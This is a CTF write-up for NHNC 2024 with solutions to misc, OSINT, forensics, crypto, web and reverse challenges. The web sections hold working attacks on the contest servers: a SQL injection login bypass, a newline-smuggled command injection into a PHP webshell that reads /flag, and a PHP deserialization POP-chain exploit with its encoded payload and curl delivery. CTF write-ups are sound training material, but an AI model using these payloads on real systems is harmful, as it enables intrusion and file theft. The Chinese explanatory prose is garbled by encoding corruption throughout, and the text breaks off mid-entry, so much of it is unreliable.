---
title: NHNC 2024 writeup
published: 2024-11-19
description: "Writeup for NHNC 2024"
tags: ["Cybersec","writeup"]
category: CTF
draft: false
lang: zh_TW
---

![image](https://hackmd.io/_uploads/rkGxWW_MJg.png)


# Misc
## "A Gift from the Leader Organizer" (1 pt)
![image](https://hackmd.io/_uploads/rJGfy8FzJl.png)
ç¸½å¬å¤§äººæœ€å¸¥äº†ğŸ˜˜

> NHNC{fishbaby1011sohandsome}

## Blog 2 (20 pts)
```
å‡ºé¡Œè€…: Elliot_404

æ‰¿ä¸Šé¡Œï¼ˆBlog 1ï¼‰ï¼Œé€™å€‹ Blog çš„ä¸»äººå¥½åƒæ´©æ¼äº†ä»–ä¸æƒ³åˆ¥è®“äººçŸ¥é“çš„æ±è¥¿ï¼Œè«‹è©¦è‘—æ‰¾å‡ºä¾†
```
[Blog link](https://neko-2077.github.io/)
åœ¨[æ¨è–¦Vtuber](https://neko-2077.github.io/p/%E6%8E%A8%E8%96%A6-vtuber/)æ–‡ç« ä¸‹çš„ç•™è¨€å€ï¼Œæœ‰neko-2077çš„ç•™è¨€
![image](https://hackmd.io/_uploads/BJ6R-ZdMkx.png)
åœ¨ä»–çš„[Disqusç•™è¨€](https://disqus.com/by/neko2077/?l=zh_TW)ï¼Œæœ‰å€‹`ä¸è¦é»é€²ä¾†`
![image](https://hackmd.io/_uploads/ByiEzW_Mye.png)

é»é€²å»å°±å¯ä»¥çœ‹åˆ°Blog 2äº†
![image](https://hackmd.io/_uploads/BJvwfZ_zkx.png)

> NHNC{comments_disqusjs}

## Blog 3 (50 pts)
```
å‡ºé¡Œè€…: Elliot_404

æ‰¿ä¸Šé¡Œï¼ˆBlog 1ï¼‰ï¼Œé€™å€‹ Blog çš„ä¸»äººå¥½åƒæ´©æ¼äº†ä»–ä¸æƒ³è®“åˆ¥äººçŸ¥é“çš„æ±è¥¿ï¼Œè«‹è©¦è‘—æ‰¾å‡ºä¾†
```
[Blog link](https://neko-2077.github.io/)


ä¸€æ¨£åœ¨[æ¨è–¦Vtuber](https://neko-2077.github.io/p/%E6%8E%A8%E8%96%A6-vtuber/)é é¢è£¡ï¼Œå°é¦™é¦™çš„å°é¢åœ–å³éµ>Open image in new tab

![Screenshot 2024-11-18 080214](https://hackmd.io/_uploads/Bkn84W_z1x.png)

å¯ä»¥è§€å¯Ÿåˆ°ç¶²å€çš„`Ï†0`æœ‰é»ä¸æ­£å¸¸
![image](https://hackmd.io/_uploads/SkYi4W_G1e.png)

æŠŠå¾Œé¢çš„ç…§ç‰‡é€£çµå»æ‰ï¼Œå³å¯é€²å…¥Blog 3
![Screenshot 2024-11-18 080559](https://hackmd.io/_uploads/r1ZBSWuf1x.png)

> NHNC{image_url}

## Where is this (20 pts)
```
å‡ºé¡Œè€…: Elliot_404

 é€™åœ¨å“ªè£¡ï¼Ÿ

Flag æ ¼å¼ï¼šNHNC{ç·¯åº¦_ç¶“åº¦}
ï¼ˆç„¡æ¢ä»¶æ¨å»å–åˆ°å°æ•¸å¾Œä¸‰ä½ï¼‰

ex:NHNC{12.345_114.514}
```
é™„åœ–é€£çµ:https://nhnc.ic3dt3a.org/files/316ada6f8668dc977279ead9ed301fef/OSINT.jpg

ç·šç´¢æ˜¯é»åº—å:`æ›¾å®¶ä¹¾éºµ`ã€`æ²³å ¤ä¸Šçš„è²“`ã€`ç«¹æ±æ’éª¨é…¥éºµ`
![image](https://hackmd.io/_uploads/SyrcUZOGJe.png)

æ¥è‘—åœ¨google mapä¸Šæœå°‹å³å¯<br>
è¨»:ä¸å»ºè­°ç”¨`æ›¾å®¶ä¹¾éºµ`æœå°‹<br>

æˆ‘ç”¨`æ²³å ¤ä¸Šçš„è²“`åœ¨google mapä¸Šæœå°‹ï¼Œåªæ‰¾åˆ°ä¸€å€‹åœ°æ–¹ï¼Œä¹Ÿç¬¦åˆåœ–ç‰‡è£¡`âŠ¥`çš„é“è·¯çµæ§‹
![image](https://hackmd.io/_uploads/H1cEvZdGkl.png)

å³éµå³å¯çœ‹åˆ°ç¶“ç·¯åº¦è³‡è¨Š
![image](https://hackmd.io/_uploads/H1MzO-_fyx.png)

> NHNC{24.802_120.979}

## NHNC, but C0LoRfUl (39 pts)
```
å‡ºé¡Œè€…:chilin.h

https://discord.gg/BhrD6sPtNs

Everyone is welcome here!
I felt that the original server was too old-fashioned, so I added a new coloring function!
Whether you are an administrator, a worker, or a participant, you can color your fonts!

æ­¡è¿å¤§å®¶ä¾†é€™é‚Šï¼
æˆ‘è¦ºå¾—åŸæœ¬çš„ä¼ºæœå™¨å¤ªå¤æ¿äº†ï¼Œæ‰€ä»¥æ–°å¢äº†ä¸Šè‰²åŠŸèƒ½ï¼
ç„¡è«–ä½ æ˜¯ç®¡ç†å“¡ã€å·¥äººã€é‚„æ˜¯åƒèˆ‡è€…ï¼Œéƒ½å¯ä»¥ç‚ºä½ çš„å­—é«”ä¸Šè‰²ï¼
```

é€²å…¥Discord Serverï¼Œç™¼ç¾æˆ‘å€‘æœ‰ç®¡ç†èº«åˆ†çµ„çš„æ¬Šé™ï¼Œç›´æ¥é–‹å¥½é–‹æ»¿
![image](https://hackmd.io/_uploads/SyKV5buzkx.png)

å°±å¯ä»¥çœ‹åˆ°å¤šå‡ºç¾äº†`flag` channel
![image](https://hackmd.io/_uploads/H10cwadfye.png)


è§£ç¢¼base64å³å¯

> NHNC{oI\*Y1oxk^@vbXLbxXSQ89N3vsW$zoS5\*QQp5riz^q$Zj9hMc55X\*w3sg6CP10bD6cTadaz2aHVjt0qK#nwdiUDt2#9Dj^\*Wo5a9$6LecFD&Ir*ewufJ4LEjk0XUCYTe0}   

# Forensics
## BotNet1 (60 pts)
```
å‡ºé¡Œè€…: whale.120

Some bad bots (uhh...maybe contracts) are trading on Sepolia Ethernaut test net, the first bot's address is 0xAD840c4c2F869896EfE0891614faA1908dcD0153, find it's pal's address and wrap it in NHNC{}!
```

é€²å…¥[Sepolia-etherscan](https://sepolia.etherscan.io/)ï¼Œè¼¸å…¥çµ¦å®šçš„åœ°å€<br>
åœ¨Internal Transectionä¸­ï¼Œæœ‰ä¸€ç­†åˆç´„
![image](https://hackmd.io/_uploads/BkOwpZ_z1e.png)

> NHNC{0x3e9e0e9cee22Ccd0ac94604A72394B0A1CCdb27A}

## BotNet2 (80 pts)
```
å‡ºé¡Œè€…: whale.120

You have discovered the suspicious trade, now find the stacked data on it's pal!
```
é€²å»çœ‹ä¸Šä¸€é¡Œè§£å‡ºä¾†çš„çš„åœ°å€
![image](https://hackmd.io/_uploads/SkecEDGOfkx.png)

é€²å»çœ‹é€™ç­†äº¤æ˜“ï¼Œé¸Show moreï¼ŒView input asé¸UTF-8
![image](https://hackmd.io/_uploads/SyhYvMdMyg.png)

> NHNC{boti_boti_im_in_ur_wifi}

# Crypto
## AES? (20 pts)
```
å‡ºé¡Œè€…: LemonTea

ä¸€æ®µåŠ å¯†çš„è¨Šæ¯ï¼Œéœ€è¦ç ´è§£åŠ å¯†æ‰èƒ½è§£é–‹ã€‚
```
[file link-output.txt](https://nhnc.ic3dt3a.org/files/994e70a682099984b99dfb31372f21e1/output.txt?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NDd9.ZzqZRQ.L9Qb3fXpKHBXxAfGWpjllJ4PbFs) 
output.txt:
```
Enter IV: 1234567890987654
Secret Key: 1234567890987654
output: TkdU8sqjliuakA+nj2aEmbDf+AaJwASfPuooaKadCqg=
```

éš¨ä¾¿æ‰¾å€‹AES online decryptionï¼Œé¸CBC mode
![image](https://hackmd.io/_uploads/BJBqcMOfke.png)

> NHNC{Y0u_kn0w_AES}

## Baby RSA (40 pts)
```
å‡ºé¡Œè€…: whale.120

RSA for babys
```
[file link-chal_17.py](https://nhnc.ic3dt3a.org/files/0af753d4faa8a004ce0b627fecca875e/chal_17.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Njl9.Zzqanw.RSAvFnKI5xa5MVKYZGVs-a3lsPA)

[//]: # (chal_17.py:)
```py file=chal_17.py
from Crypto.Util.number import *
from Secret import flag1
primes=[getPrime(512) for _ in range(3)]
p, q, r=primes[0], primes[1], primes[2]
n=p*q*r
e=0x10001
leak=p*q+q*r+r*p-p-q-r
c=pow(bytes_to_long(flag1), e, n)
print(f"{n=}\n{e=}\n{c=}\n{leak=}")

# output
'''
n=1588313940811583670388901008799979643227508347921726508187845925121888018384295030557217724452854073354506733734948963728906121944748626336175026165501032867164031437646285616387352213662865798266568754187475074439344239971434650851017361305440785085800565077621928128381888304170806890898358358161543138717722884498671012157552627202558915649163030193095159221015850832580026640394276672929163085422040567666556330271222397965912435822921196421000606733571473897
e=65537
c=1486820855515154236162411677801199668086445706624424596450332681618232039310031299864777925283743527869824964609902697207891204276017844138716399611186082902687240749084575448807382032315300097699346046330339044585017938639264266759415446628256358731949386881533600592561504081326543143711535184034996293644573109963922652147003096600799028140241574358077390864861527823922494294399292630017130705549749378273155565300089441218224857894833601009764541100666507221
leak=409806027984142046827568136516718279278250684987305418639665531440726724145235686048985209175210488783213754343387799291126405560172391062085673659617777577945402272340754442512900552853645251776025848281268240863874332635558325107405944737687367206917286149877313697949861173539315761823960563606616395256712
'''
```

æ•´ç†ä¸€ä¸‹å·²çŸ¥è³‡è¨Š:

$n = p \cdot q \cdot r$<br>
$leak = pq + qr + rp - p - q - r$<br>

é€™æ¨£ï¼Œæˆ‘å€‘å°±å¯ä»¥é–‹å§‹è¨ˆç®—$\varphi (n)$:

$\varphi (n) = (p - 1)  (q - 1)  (r - 1)$

å±•é–‹:

$\varphi (n) = pqr - pq - pr - qr + p + q + r - 1$

`n`å’Œ`leak`å¸¶å…¥$\varphi (n)$å¯å¾—:

$\varphi (n)=n - \text{leak} - 1$

exploit:
```python=
from Crypto.Util.number import *

n = 1588313940811583670388901008799979643227508347921726508187845925121888018384295030557217724452854073354506733734948963728906121944748626336175026165501032867164031437646285616387352213662865798266568754187475074439344239971434650851017361305440785085800565077621928128381888304170806890898358358161543138717722884498671012157552627202558915649163030193095159221015850832580026640394276672929163085422040567666556330271222397965912435822921196421000606733571473897
e = 65537
c = 1486820855515154236162411677801199668086445706624424596450332681618232039310031299864777925283743527869824964609902697207891204276017844138716399611186082902687240749084575448807382032315300097699346046330339044585017938639264266759415446628256358731949386881533600592561504081326543143711535184034996293644573109963922652147003096600799028140241574358077390864861527823922494294399292630017130705549749378273155565300089441218224857894833601009764541100666507221
leak = 409806027984142046827568136516718279278250684987305418639665531440726724145235686048985209175210488783213754343387799291126405560172391062085673659617777577945402272340754442512900552853645251776025848281268240863874332635558325107405944737687367206917286149877313697949861173539315761823960563606616395256712

phi_n = n - leak - 1
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
```

> NHNC{baby_math_won}

## Secret ROT13 (40 pts)
```
å‡ºé¡Œè€…: LemonTea

ä¸€æ®µåŠ å¯†çš„è¨Šæ¯ï¼Œéœ€è¦ç ´è§£åŠ å¯†æ‰èƒ½è§£é–‹ã€‚
```
[file link-output.txt](https://nhnc.ic3dt3a.org/files/53b33dc077dcfca2362347ca70191fc4/output.txt?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NTR9.Zzv0BA.b6r2Zoik-Eu9vLCdTZ4ee4ea7u0)
[file link-source.py](https://nhnc.ic3dt3a.org/files/211c55dcd9826daa8c3bd7962d719825/source.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NTV9.Zzv0BA.3jnZWJkABECM6BBvokhnIRaSD3A)
source.py:
```python=
def encrypt(text, key):
    encrypted_text = ""
    for i, char in enumerate(text):
        offset = ((i + 1 + key) * (i + 1)) % 26 
        if 'A' <= char <= 'Z':
            new_char = chr((ord(char) - ord('A') + offset) % 26 + ord('A'))
        elif 'a' <= char <= 'z':
            new_char = chr((ord(char) - ord('a') + offset) % 26 + ord('a'))
        else:
            new_char = char 
        encrypted_text += new_char
    return encrypted_text

# æ¸¬è©¦ç¯„ä¾‹
key = 7
plaintext = "NHNC{TEST}"
ciphertext = encrypt(plaintext, key)
print("åŠ å¯†å¾Œçš„å¯†æ–‡:", ciphertext)
```
output.txt:
```
VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}
```

æ¯å€‹å­—å…ƒçš„åŠ å¯†æ˜¯åŸºæ–¼å…¶ä½ç½® `i` å’Œçµ¦å®šçš„å¯†é‘° `key`
$\text{offset} = ((i + 1 + \text{key}) \times (i + 1)) \% 26$

åå‘æ“ä½œï¼ŒæŠŠ`offset`æ¸›æ‰ï¼Œç„¶å¾Œé‚„åŸåˆ°å°æ‡‰çš„ASCIIç¯„åœ

æœ€å¾Œæš´åŠ›æ‰¾`key`

exploit:
```python=
def decrypt(encrypted_text, key):
    decrypted_text = ""
    for i, char in enumerate(encrypted_text):
        offset = ((i + 1 + key) * (i + 1)) % 26 
        if 'A' <= char <= 'Z':
            new_char = chr((ord(char) - ord('A') - offset) % 26 + ord('A'))
        elif 'a' <= char <= 'z':
            new_char = chr((ord(char) - ord('a') - offset) % 26 + ord('a'))
        else:
            new_char = char 
        decrypted_text += new_char
    return decrypted_text

for i in range(1, 26):
    print(decrypt("VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}", i))
```
```bash
â””â”€$ python3 epx_rot13.py | grep NHNC
NHNC{Y0u_kn0w_H0w_to_decrypte}
```

> NHNC{Y0u_kn0w_H0w_to_decrypte}

## Ande Yo Caliente (60 pts)
```
å‡ºé¡Œè€…: whale.120

Chacha~
```
[file link](https://nhnc.ic3dt3a.org/files/01b1412b45bb251fa9bc243216689584/chal.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NDh9.ZzwKzQ.BPKmyaHbm67_hF9JY3I0PYgeZ0s)

chal.py:
```python=
from Crypto.Cipher import ChaCha20
from secret import FLAG
import os
def encrypt(message, key, nonce):
    cipher = ChaCha20.new(key=key, nonce=iv)
    ciphertext = cipher.encrypt(message)
    return ciphertext
message = b'When you feel my heat, look into my eyes\nIt\'s where my demons hide'
key, iv = os.urandom(32), os.urandom(12)
encrypted_message = encrypt(message, key, iv)
encrypted_flag = encrypt(FLAG, key, iv)
data = iv.hex() + '\n' + encrypted_message.hex() + '\n' + encrypted_flag.hex()
f=open("out.txt", "w")
f.write(data)
'''
out.txt:
635b52504ab86d67d780dede
eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e
f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66
'''
```
é€™é¡Œçµ¦äº†ä¸€å€‹æ˜æ–‡çš„message/åŠ å¯†éçš„messageï¼Œé‚„æœ‰åŠ å¯†éçš„flagï¼Œä»¥åŠåŠ å¯†å…©è€…çš„`IV`(ChaCha20çš„`nonce`)

ä½†ChaCha20çš„åŠ å¯†æ³•æ˜¯ç”Ÿæˆä¸€å€‹keystreamå†XOR

$\text{ciphertext} = \text{keystream} \oplus \text{text}$

æ‰€ä»¥å…¶å¯¦ä¸ç”¨`IV`ä¹Ÿæ²’å·®?

æ‰€ä»¥å°±åˆ©ç”¨XORçš„ç‰¹æ€§ï¼Œç”¨çµ¦å®šçš„æ˜/å¯†æ–‡å¾—åˆ°keystream

å†ç”¨keystreamè§£flag

exploit:
```python=
from Crypto.Cipher import *
from binascii import *

#iv = unhexlify("635b52504ab86d67d780dede")
encrypted_message = unhexlify("eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e")
encrypted_flag = unhexlify("f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66")

message = b"When you feel my heat, look into my eyes\nIt's where my demons hide"

stream = bytes([m ^ c for m, c in zip(message, encrypted_message)])
flag = bytes([c ^ s for c, s in zip(encrypted_flag, stream)])

print(flag.decode())
```

>NHNC{what_i_learned_from_htb}

## Duplicated (255 pts)
```
I don't know what to say, just a tricky but kinda easy one.

Do you catch your breath when I look at you?
Are you holding back, like the way I do?
URL: http://23.146.248.134:31337/check
```
[file link](https://nhnc.ic3dt3a.org/files/343e5057666aa35348b147f9be75b112/source.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Njh9.ZzwpMQ.zs5OMSmM2FgD1yAM8nPIhifiAFI)

source.py:

```python=
from flask import Flask, request, jsonify
import base64
import hashlib

app = Flask(__name__)

def base64_decode(data):
    try:
        return base64.b64decode(data)
    except Exception:
        return None

def validate_pair(data1, data2):
    decoded1 = base64_decode(data1)
    decoded2 = base64_decode(data2)
    
    if decoded1 is None or decoded2 is None:
        return False
    if b"whale_meowing" not in decoded1 or b"whale_meowing" not in decoded2:
        return False

    md5_1 = hashlib.md5(decoded1).hexdigest()
    md5_2 = hashlib.md5(decoded2).hexdigest()
    return md5_1 == md5_2

@app.route('/check', methods=['POST'])
def check():
    try:
        data = request.get_json()

        if not isinstance(data, list) or not all(isinstance(pair, list) and len(pair) == 2 for pair in data):
            return jsonify({"status": "wrong", "error": "Invalid input format"}), 400

        if len(data) != 100:
            return jsonify({"status": "wrong", "error": "Exactly 100 pairs required"}), 400

        all_inputs = [item for pair in data for item in pair]
        if len(all_inputs) != len(set(all_inputs)):
            return jsonify({"status": "wrong", "error": "Duplicate inputs found"}), 400
        
        for pair in data:
            if not validate_pair(pair[0], pair[1]):
                return jsonify({"status": "wrong"}), 200
        
        return jsonify({"status": "NHNC{FAKE_FLAG}"}), 200

    except Exception as e:
        return jsonify({"status": "wrong", "error": str(e)}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=31337)
```

ä»–æœƒæ¥æ”¶ä¸€å€‹é•·åº¦ç‚º100çš„`data`

ç„¶å¾Œ`data`è£¡é¢åŒ…å«ä¸€å€‹listï¼Œè£¡é¢æ”¾å…©å€‹Base64ç·¨ç¢¼éçš„å­—ä¸²

æœ€å¾Œåšé©—è­‰:
- æ²’æœ‰é‡è¤‡çš„Base64å­—ä¸²
- Base64è§£ç¢¼å¾Œå¿…é ˆåŒ…å«`whale_meowing`
- Listå…§å…©å€‹å­—ä¸²MD5é›œæ¹Šéå¿…é ˆè¦ä¸€æ¨£

~~ç„¶å¾Œé€éChatGPT~~ï¼Œç™¼ç¾Base64æœ‰å€‹ç‰¹æ€§:è§£ç¢¼æ™‚æœƒå¿½ç•¥ç©ºæ ¼ã€`!`ã€`-`ç­‰ä¸æ”¯æ´çš„å­—å…ƒ

ç¨å¾®å¯¦é©—ä¸€ä¸‹:
```python
>>> base64.b64decode("YWJj".encode())
b'abc'
>>> base64.b64decode("Y W J j".encode())
b'abc'
>>> base64.b64decode("Y W!Jj".encode())
b'abc'
>>> base64.b64decode("Y!W\nJ\rj".encode())
b'abc'
>>> base64.b64decode("Y!W\nJ~ j_.-".encode())
b'abc'
```
çœŸçš„ã„Ÿï¼Œå¥½æ‰¯ã„›

é€™æ¨£å°±å¯ä»¥å¯«exploitã„Œ:
```python=
import requests
import base64

url = "http://23.146.248.134:31337/check"

def generate_variants(encoded_str, existing_set):
    variants = set()
    for i in range(2):
        new_str = ''
        for c in encoded_str:
            new_str += c 
        if(i==1):
            new_str += ' '
        new_str += ' '
        variants.add(new_str)
        existing_set.add(new_str)
    return list(variants)

data = []
all_inputs_set = set()

for i in range(100):
    content = f"whale_meowing_{i}".encode()
    base_encoded = base64.b64encode(content).decode()
    variants = generate_variants(base_encoded,all_inputs_set)
    data.append(variants)

response = requests.post(url, json=data)
print(response.json())
```

> NHNC{is_md_an_abbreviation_for_maid?}

# Web
## å“¥å¸ƒæ—ä¿è¡éƒ¨å…¬å‘Š (30 pts)
```
å‡ºé¡Œè€…: å“¥å¸ƒæ—é•·è€-Frank

ç‚ºä¿è­·æˆ‘å“¥å¸ƒæ—æ—åŒèƒï¼Œæœ¬ä¿è¡›éƒ¨ç‰¹å‡ºæ­¤å…¬å‘Šä»¥ä¿è­·æˆ‘å€‘å…æ–¼ç²¾éˆæ—çš„èª˜æƒ‘ï¼
HINT:ç”¨Burp suiteæŠ“çœ‹çœ‹å— è¦é€™éº¼éº»ç…©å—
```
Link:https://nhnc-ctf-frank.dypc.cc/

ç›´æ¥View page source
![image](https://hackmd.io/_uploads/BJSauGuMJl.png)

> NHNC{BeCareful!}


## EASY METHOD (100 pts)
```
I "PUT" something in the website, could u find the "METHOD" to get it?

http://23.146.248.227:60001/
```
ç”¨browseræ‰“é–‹
![image](https://hackmd.io/_uploads/HJvOTcdf1x.png)

æ¨æ¸¬æ‡‰è©²è¦ç”¨ä¸åŒçš„methodï¼Œçµåˆææ•˜ï¼Œæ¨æ¸¬ç”¨`PUT`

ç”¨curlæŠ“ä¸‹ä¾†
```bash
â””â”€$ curl -X PUT http://23.146.248.227:60001/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTTP Method Challenge</title>
</head>
<body>
    <h1>é€™æ˜¯æˆ‘çš„ç¶²ç«™</h1>
    <p>ä¾†æ‰¾æ‰¾çœ‹æˆ‘å­˜åœ¨é€™è£¡çš„é…·é…·è³‡æ–™</p>

    <p><strong>FLAG: NHNC{Y0u_kn0w_H0w_t0_us3_CURL}</strong></p></body>
</html>
```

> NHNC{Y0u_kn0w_H0w_t0_us3_CURL}

## I need to get the C00kies (100 pts)
```
å‡ºé¡Œè€…: LemonTea

I am making a web that can show something but I can't become an admin and get the cookies can you help me?
http://chal.nhnc.ic3dt3a.org:60002/
```

é€£é€²å»é•·é€™æ¨£:
![image](https://hackmd.io/_uploads/HJBQu2OG1l.png)

åœ¨Application > Cookiesï¼Œå¯ä»¥çœ‹åˆ°ç›®å‰çš„roleæ˜¯user:
![image](https://hackmd.io/_uploads/Sy7Uu3OMJl.png)

å³éµEdit Valueæ”¹adminï¼ŒReload Page
![image](https://hackmd.io/_uploads/S1l5d2OG1l.png)

> NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}

## Login (100 pts)
```
Just login and get the flag

http://chal.nhnc.ic3dt3a.org:60003/
```

å°±ä¸€å€‹å¾ˆç°¡å–®çš„Login Pageï¼Œç›´è¦ºSQL Injection
![image](https://hackmd.io/_uploads/S1fAchdf1x.png)

ç•¶æ™‚å•¥éƒ½æ²’æƒ³ï¼Œéš¨ä¾¿æ§‹é€ ä¸€å€‹payload:
`admin' OR 1=1--`

...ç„¶å¾Œå°±æ‰“é€²å»äº†XDDD
![image](https://hackmd.io/_uploads/SyV2i3OM1e.png)

> NHNC{S1mp|e_-_SQL!}

## 1 line php (300 pts)
```
1 line >w<b

http://chal.nhnc.ic3dt3a.org:60000
Hint:
Flag is at /
```
é€£é€²å»:
![image](https://hackmd.io/_uploads/S1J7nhOz1l.png)
ä¸€å€‹å¾ˆç°¡å–®çš„phpæœ¨é¦¬ï¼Œä½†ç™¼ç¾å‰é¢æ’äº†ä¸€å€‹è¨»è§£ç¬¦è™Ÿï¼Œè®Šæˆä¸æœƒåŸ·è¡Œ`system()`å‡½æ•¸

æˆ‘å€‘å¯ä»¥ç”¨æ›è¡Œçš„æ–¹å¼è¦é¿æ‰

`cmd`åƒæ•¸ç”¨`%0Als%20/`(`%0A`æ˜¯æ›è¡Œçš„URLç·¨ç¢¼):
![image](https://hackmd.io/_uploads/HymagTuzJe.png)
flagçš„æª”æ¡ˆæ˜¯`flag-`

payload:
`http://chal.nhnc.ic3dt3a.org:60000/?cmd=%0A%20cat%20/flag-`

> NHNC{enter_is_always_the_best}

## Democracy (350 pts)
```
å‡ºé¡Œè€…: Frank

The Republic of Frank National Assembly needs your participation! Head over here

Hint:
FOSS-Its means Open for what?
```
Link:https://nhnc-ctf-frank2.dypc.cc/
![image](https://hackmd.io/_uploads/SkEcEauMkx.png)

æŒ‰ä¸‹`æˆ‘è¦è¦†è­°`æŒ‰éˆ•ï¼Œæœƒè¢«rick roll

ä½†çœ‹ä»–çš„è·³è½‰é€£çµï¼Œæ˜¯å°å‘`/next`
![image](https://hackmd.io/_uploads/S1ver6dG1g.png)

ç”¨Burp Suiteï¼Œæ””å°åŒ…çœ‹HTTP History
![image](https://hackmd.io/_uploads/HJdnrp_Mkx.png)

åªå°ˆæ³¨åœ¨`/next`çš„response

è£¡é¢çš„å…§å®¹å¾ˆå¤šå¾ˆäº‚ï¼Œä½†æœ€å¾Œå¯ä»¥çœ‹åˆ°:
![image](https://hackmd.io/_uploads/S15UU6_G1g.png)

ç”¨Dev mode > Consoleå°±å¯ä»¥çœ‹åˆ°äº†(è¨˜å¾—ç”¨burp suiteå¡è‘—) 
![image](https://hackmd.io/_uploads/Hy1nI6ufJe.png)

>NHNC{That'sEasyRight?}

## POPcorn (460 pts)
```
Do you know what's a POP Chain?
flag is in /flag

http://chal.nhnc.ic3dt3a.org:60008/
```
é»é–‹å‡ºç¾ä¸€å€‹è¼¸å…¥æ¡†ï¼Œé‚„æœ‰ç¶²é åŸå§‹ç¢¼

é¡Œç›®å‘Šè¨´æˆ‘å€‘æ˜¯phpååºåˆ—åŒ–æ¼æ´

åªé—œæ³¨phpçš„éƒ¨åˆ†:
```php=
<?php
class WHALE{
    public function __construct($name, $report_uri)
    {
        $this->name = $name;
        $this->report_uri = $report_uri;
    }

    public function __get($obj)
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $this->report_uri);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        echo $response;
    }

    public function __wakeup()
    {
        echo "NHNC{FAKE_FLAG}";
    }

}

class MEOW{
    public function __construct($cat_struct)
    {
        $this->id = $cat_struct;
        echo $this->id->name;
    }
    public function __toString()
    {
        return     $this->id->r3a1_name;
    }
    public function __sleep()
    {
        return "serialized >w<b, but I want to sleep :zzz:";
    }
}

class TEST{
    public function __construct($note, $url)
    {
        $this->note = $note;
        $this->url = $url;
    }
    public function __destruct()
    {
        if (preg_match('pwned', $this->url))
        {
            system('echo `date` >> log.txt');
        };
    }
}

if (isset($_POST['pop'])){
    unserialize(base64_decode($_POST['pop']));
}
?>
```
é¦–å…ˆè¦ç†è§£phpçš„[Magic Method](https://docs.phplang.net/manual/en/language.oop5.magic.php)
- `__wakeup()` \: objectè¢«deserializationæ™‚è‡ªå‹•èª¿ç”¨
- `__destruct()` \: objectçš„lifecycleçµæŸ(è¢«Destruction)è‡ªå‹•èª¿ç”¨
- `__get()` \: è¨ªå•æœªå®šç¾©æ™‚è‡ªå‹•èª¿ç”¨

ç„¶å¾Œæˆ‘å€‘æœƒç™¼ç¾:

phpè…³æœ¬çµæŸæ™‚ï¼Œæœƒè‡ªå‹•èª¿ç”¨`TEST::__destruct()`

è£¡é¢çš„`grep_match('pwned', $this->url)`ç¬¬äºŒå€‹åƒæ•¸æ‡‰è©²æ˜¯`string`ï¼Œä½†`$this->url`æ˜¯ä¸€å€‹object

é€™æ™‚å€™å°±æœƒè‡ªå‹•è§¸ç™¼`MEOW::__toString()`ï¼Œè£¡é¢åˆè¨ªå•äº†`$this->id->r3a1_name`

ä½†`r3al_name`æ²’è¢«å®šç¾©ï¼Œé€™æ™‚å€™è§¸ç™¼`WHALE::__get()`(`__get(r3al_name)`)

ç„¶å¾Œgetè£¡é¢åŸ·è¡Œäº†curlè«‹æ±‚

payloadç›®æ¨™:`__get()`è«‹æ±‚å…§çš„`curl(r3al_name)`æ”¹ç‚º`curl(file:///flag)`


æ’°å¯«exploit:
```php=
<?php
class WHALE{
    public function __construct($name, $report_uri)
    {
        $this->name = $name;
        $this->report_uri = $report_uri;
    }
}

class MEOW{
    public function __construct($cat_struct)
    {
        $this->id = $cat_struct;
    }
}

class TEST{
    public function __construct($note, $url)
    {
        $this->note = $note;
        $this->url = $url;
    }
} 
$whale = new WHALE('abc', 'file:///flag');
$meow = new MEOW($whale);
$test = new TEST('test', $meow);

$serialized = serialize($test);
$payload = base64_encode($serialized);
echo $payload;
?>
```
å‚³é€payload:
```bash
â””â”€$ curl -X POST -d "pop=Tzo0OiJURVNUIjoyOntzOjQ6Im5vdGUiO3M6NDoidGVzdCI7czozOiJ1cmwiO086NDoiTUVPVyI6MTp7czoyOiJpZCI7Tzo1OiJXSEFMRSI6Mjp7czo0OiJuYW1lIjtzOjM6ImFiYyI7czoxMDoicmVwb3J0X3VyaSI7czoxMjoiZmlsZTovLy9mbGFnIjt9fX0=" http://chal.nhnc.ic3dt3a.org:60008/index.php
NHNC{FAKE_FLAG}NHNC{is_pop_chain_a_kind_of_injection_?_anyway_is_the_best_language_for_hackers}
```
>NHNC{is_pop_chain_a_kind_of_injection_?_anyway_is_the_best_language_for_hackers}

# Reverse
## easyyyyyyyyyy (50 pts)
```
author: kohiro

No more hint because it is so eazyyyyyyyyy
```
[file link](https://nhnc.ic3dt3a.org/files/05c9a039e51004dc963aac8468d448d6/NHNCbabyreverse?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Mjh9.ZzqsOg.BUtpJUjsa6UuOIG4bAbI6mOrGLw)

ç”¨radare2åˆ†æï¼Œaflçœ‹åˆ°:
```bash
0x00401550    1     27 dbg.flag()
```
VVé€²å»:
![image](https://hackmd.io/_uploads/HyJq6mdGJe.png)

> NHNC{this_is_a_easy_one}

## Guess the num (200 pts)
```
å‡ºé¡Œè€…ï¼šraymond

